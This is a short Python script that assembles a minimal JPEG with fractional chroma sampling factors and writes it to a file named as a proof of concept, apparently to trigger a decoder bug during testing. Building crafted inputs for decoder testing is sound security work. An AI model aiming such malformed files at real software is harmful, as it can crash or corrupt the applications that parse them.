from pathlib import Path

def seg(marker, data):
    return bytes([0xff, marker]) + (len(data)+2).to_bytes(2,'big') + data
b=bytearray(b'\xff\xd8')
# DQT all ones table 0
b += seg(0xdb, bytes([0]) + bytes([1]*64))
# DHT DC table 0: one code length 1, symbol category 0
counts = bytes([1]+[0]*15)
b += seg(0xc4, bytes([0x00]) + counts + bytes([0x00]))
# DHT AC table 0: one code length 1, symbol EOB 0x00
b += seg(0xc4, bytes([0x10]) + counts + bytes([0x00]))
# SOF0 17x8 3 components fractional h 3/2/2 v 1
sof = bytes([8]) + (8).to_bytes(2,'big') + (17).to_bytes(2,'big') + bytes([3, 1,0x31,0, 2,0x21,0, 3,0x21,0])
b += seg(0xc0, sof)
# SOS all tables 0
sos = bytes([3, 1,0x00, 2,0x00, 3,0x00, 0,63,0])
b += seg(0xda, sos)
# entropy 7 zero blocks * (DC0 len1 + EOB len1) = 14 zeros + pad ones
b += bytes([0x00,0x03])
b += b'\xff\xd9'
Path('/workspace/poc_min_frac.jpg').write_bytes(b)
print(len(b), b.hex())
